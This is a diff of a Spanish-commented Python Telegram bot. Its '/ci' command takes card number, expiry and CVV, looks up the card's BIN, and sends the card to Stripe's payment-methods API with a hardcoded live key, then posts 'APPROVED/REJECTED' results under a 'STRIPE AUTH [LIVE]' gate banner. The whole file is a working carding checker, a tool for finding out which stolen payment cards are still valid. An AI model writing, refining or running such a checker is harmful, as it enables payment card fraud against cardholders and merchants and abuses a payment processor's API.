@@ -1,114 +1,106 @@
-import time
-import random
-import string
-import re
-import requests
-
+import time, requests, re, random, string
 from pyrogram import Client, filters
-from values import sk_headers, get_time_taken  # Solo lo que usas
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-@Client.on_message(filters.command("ci", prefixes=[".", "/", "!"]) & filters.text)
-async def ci_handler(client, message):
-    started_time = time.time()
+from values import sk_headers, get_time_taken
 
+
+@Client.on_message(filters.command("ci", [".", "/", "!"]))
+async def stripe_auth(client, message):
+    inicio = time.time()
     user_id = message.from_user.id
     nombre = message.from_user.first_name
 
-    # Si el mensaje es respuesta a otro mensaje, toma el texto de ese mensaje
+    # Extraer tarjeta
     if message.reply_to_message:
-        text_to_check = message.reply_to_message.text or ""
+        texto = message.reply_to_message.text
     else:
-        text_to_check = message.text or ""
+        try:
+            texto = message.text.split(None, 1)[1]
+        except:
+            return await message.reply("<b>Formato requerido: CC|MM|AA|CVV</b>", parse_mode="html")
 
-    # Parseo de tarjeta con regex para números
     try:
-        input_data = re.findall(r"[0-9]+", text_to_check)
-        if len(input_data) < 3:
-            raise ValueError("Tarjeta vacía o incompleta")
+        cc, mes, ano, cvv = re.findall(r"\d+", texto)[:4]
+    except:
+        return await message.reply("<b>Error: Formato incorrecto</b>", parse_mode="html")
 
-        if len(input_data) == 3:
-            cc, exp, cvv = input_data
-            mes = exp[:2]
-            ano = exp[2:]
-        else:
-            cc, mes, ano, cvv = input_data[:4]
-
-        # Corregir si mes está mal posicionado
-        if len(mes) > 2:
-            mes, cvv = cvv, mes
-
-    except Exception:
-        await message.reply("<b>Error al procesar tarjeta: formato incorrecto</b>")
-        return
-
-    # Validaciones básicas (puedes omitir o ajustar)
-    if len(cc) not in [15, 16]:
-        await message.reply("<b>Tarjeta inválida o longitud incorrecta</b>")
-        return
-    if not (1 <= int(mes) <= 12):
-        await message.reply("<b>Mes inválido</b>")
-        return
     if len(ano) == 2:
         ano = "20" + ano
-    if not (2021 <= int(ano) <= 2029):
-        await message.reply("<b>Año inválido</b>")
-        return
-    if (cc[0] == '3' and len(cvv) != 4) or len(cvv) not in [3, 4]:
-        await message.reply("<b>CVV inválido</b>")
-        return
+
+    bin_ = cc[:6]
 
     # Consulta BIN
-    bin_ = cc[:6]
-    bin_req = requests.get(f" https://lookup.binlist.net/{bin_}")
-    if bin_req.status_code != 200:
-        await message.reply("<b>Error al consultar BIN</b>")
-        return
+    try:
+        r = requests.get(f"https://lookup.binlist.net/{bin_}", timeout=10).json()
+        banco = r.get("bank", {}).get("name", "N/A")
+        tipo = r.get("type", "N/A")
+        pais = r.get("country", {}).get("name", "N/A")
+        emoji = r.get("country", {}).get("emoji", "")
+        esquema = r.get("scheme", "N/A")
+    except:
+        banco, tipo, pais, emoji, esquema = ["N/A"] * 5
 
-    bin_data = bin_req.json().get("data")
-    if not bin_data:
-        await message.reply("<b>BIN no encontrado</b>")
-        return
+    # Datos aleatorios
+    correo = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"
 
-    # Datos aleatorios para zip y email
-    user_info = requests.get("https://randomuser.me/api/?nat=us&inc=name,location").json()["results"][0]
-    zip_code = user_info['location']['postcode']
-    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"
-
-    # Preparar payload para Stripe
-    payload = {
+    # Stripe AUTH checker con /v1/payment_methods
+    sk_key = "pk_live_kbUIwYxKNj8PVjKFAaDN5ZN300MXislCjC"  # 🔐 Cambia a tu sk_live
+    headers = sk_headers(sk_key)
+    data = {
+        "type": "card",
         "card[number]": cc,
-        "card[cvc]": cvv,
         "card[exp_month]": mes,
         "card[exp_year]": ano,
-        "card[address_zip]": zip_code,
-        "guid": "NA",
-        "muid": "random123",
-        "sid": "random456",
-        "payment_user_agent": "stripe.js",
-        "time_on_page": "39315",
-        "key": "pk_live_kbUIwYxKNj8PVjKFAaDN5ZN300MXislCjC"
+        "card[cvc]": cvv,
+        "billing_details[email]": correo,
     }
 
-    # Solicitud a Stripe
-    res = requests.post("https://api.stripe.com/v1/tokens", headers=sk_headers, data=payload)
-    result = res.json()
+    try:
+        r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=10)
+        res = r.json()
+    except Exception:
+        return await message.reply("<b>Error al contactar con Stripe</b>", parse_mode="html")
 
-    if "id" in result:
-        status = "APPROVED✅ [CHARGED]"
-    elif "error" in result:
-        status = "REJECTED❌ [INCORRECT CARD]"
+    # Interpretar resultado
+    if "id" in res and res.get("card", {}).get("checks", {}).get("cvc_check") == "pass":
+        status = "APPROVED ✅ [CVV MATCH]"
+    elif "error" in res:
+        msg_error = res["error"].get("message", "").upper()
+        status = f"REJECTED ❌ [{msg_error}]"
     else:
-        status = "REJECTED❌ [ERROR]"
+        status = "REJECTED ❌ [UNKNOWN ERROR]"
 
-    # Formatear y enviar resultado
-    response_text = f"""
-<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
-<b>【〄】</b> INPUT: <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>【〄】</b> RESULT: <b>{status}</b>
-<b>【〄】</b> BANK INFO: <b>{bin_data.get('bank', 'N/A')} - {bin_data['countryInfo']['code']}({bin_data['countryInfo']['emoji']})</b>
-<b>【〄】</b> BIN INFO: <code>{bin_}</code> - <b>{bin_data.get('level', 'N/A')}</b> - <b>{bin_data.get('type', 'N/A')}</b>
-<b>【〄】</b> CHECKED BY: <b><a href="tg://user?id={user_id}">{nombre}</a></b>
-<b>【〄】</b> TIME TAKING: {get_time_taken(started_time)}s
-<b>【〄】</b> BOT BY: <b>@gsmdiego</b>"""
+    fin = get_time_taken(inicio)
 
-    await message.reply(response_text)
+    # Mensaje final
+    msg = f"""
+<b>【〄】 GATE:</b> STRIPE AUTH [LIVE]
+<b>【〄】 INPUT:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>【〄】 RESULT:</b> <b>{status}</b>
+<b>【〄】 BANK:</b> {banco} - {tipo}
+<b>【〄】 BIN:</b> <code>{bin_}</code> - <b>{esquema}</b> - <b>{pais} {emoji}</b>
+<b>【〄】 CHECKED BY:</b> <a href="tg://user?id={user_id}">{nombre}</a>
+<b>【〄】 TIME TAKEN:</b> {fin}s
+<b>【〄】 BOT BY:</b> @gsmdiego
+"""
+
+    buttons = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("「ADMIN 1」", url="https://t.me/admin1username"),
+            InlineKeyboardButton("「ADMIN 2」", url="https://t.me/admin2username")
+        ],
+        [
+            InlineKeyboardButton("「OWNER」", url="https://t.me/gsmdiego")
+        ]
+    ])
+
+    # URL de la imagen horizontal que quieres poner al final
+    imagen_horizontal = "https://i.pinimg.com/736x/6b/a2/0f/6ba20f856ef336693c95b2347a9cdb42.jpg"  # Cambia por tu imagen
+
+    # Enviar foto con el texto como caption
+    await message.reply_photo(
+        photo=imagen_horizontal,
+        caption=msg,
+        reply_markup=buttons,
+    )
